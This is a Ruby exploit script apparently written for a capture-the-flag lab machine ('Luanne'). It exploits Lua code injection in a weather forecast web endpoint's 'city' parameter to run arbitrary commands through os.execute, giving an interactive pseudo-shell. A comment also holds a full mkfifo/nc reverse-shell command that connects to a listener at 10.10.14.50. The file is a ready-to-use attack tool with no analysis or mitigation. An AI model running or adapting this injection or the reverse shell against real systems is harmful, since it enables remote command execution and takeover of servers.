#!/usr/bin/ruby2.7
require "erb"
require "net/http"

url = "http://10.10.10.218/weather/forecast?city=London"
prompt = "\e[1m\e[31m(luanne)>\e[1m\e[0m "
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.50 4444 >/tmp/f
puts "Exploit by @spooky_sec"
puts "\e[1m\e[33mWarning: No Time Out Supported!\e[1m\e[0m\n\n"

loop {
  print prompt
  cmd = gets.chomp
  system("clear") if cmd == "clear"
  to_be_encoded = '\');os.execute("' + cmd + '")--'
  params = ERB::Util.url_encode(to_be_encoded).to_s
  payload = url + params	
  response = Net::HTTP.get URI(payload)
  reponse = response.slice!(0, 43)
  puts response
}
